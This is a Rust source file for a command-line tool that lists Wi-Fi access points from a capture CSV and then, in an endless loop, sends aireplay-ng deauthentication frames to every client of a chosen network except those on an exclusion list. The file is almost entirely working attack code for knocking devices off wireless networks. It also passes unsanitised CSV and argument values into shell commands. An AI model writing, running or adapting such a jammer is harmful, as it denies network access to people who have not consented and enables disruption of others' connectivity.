use std::path::PathBuf;

use anyhow::{bail, Context, Result};
use structopt::StructOpt;
use subprocess::Exec;

mod cli;
mod csv;
mod data;

use cli::{Opt, SubCommand};

fn main() {
    // Parse commandline options.
    let opt = Opt::from_args();

    let result = match opt.cmd {
        SubCommand::Stations => show_stations(&opt.csv_path),
        SubCommand::Block {
            bssid,
            interface,
            excluded_macs,
        } => block_client(&opt.csv_path, &bssid, &interface, &excluded_macs),
    };

    if let Err(error) = result {
        println!("{:?}", error);
    }
}

fn show_stations(csv_path: &PathBuf) -> Result<()> {
    let (stations, _) = csv::get_csv_data(&csv_path).context("Error while reading csv")?;

    println!("Stations:");
    for station in stations.iter() {
        println!(
            "BSSID: {}, ESSID: {}, channel: {}",
            station.bssid, station.essid, station.channel
        );
    }

    Ok(())
}

fn block_client(
    csv_path: &PathBuf,
    bssid: &str,
    interface: &str,
    excluded_macs: &Vec<String>,
) -> Result<()> {
    let (stations, clients) = csv::get_csv_data(&csv_path).context("Error while reading csv")?;

    for station in stations.iter() {
        if station.bssid != bssid {
            continue;
        }
        let command = format!("iw dev {} set channel {}", interface, station.channel);

        let exec = Exec::shell(&command);
        let exit_status = exec.join()?;
        if !exit_status.success() {
            bail!("Process failed with: {:?}", exit_status);
        }
    }

    loop {
        for client in clients.iter() {
            if is_excluded(&client.station_mac, excluded_macs) {
                continue;
            };
            let command = format!(
                "aireplay-ng -0 1 -a {} -c {} {}",
                bssid, client.station_mac, interface
            );
            println!("Block client {} connected to {}", client.station_mac, bssid);

            let exec = Exec::shell(&command);
            let exit_status = exec.join()?;
            if !exit_status.success() {
                bail!("Process failed with: {:?}", exit_status);
            }
        }
        println!("Wait 1 sec");
        std::thread::sleep(std::time::Duration::from_millis(1000));
    }
}

fn is_excluded(client_mac: &str, excluded_macs: &Vec<String>) -> bool {
    for excluded_mac in excluded_macs {
        if client_mac == excluded_mac {
            return true;
        }
    }

    false
}
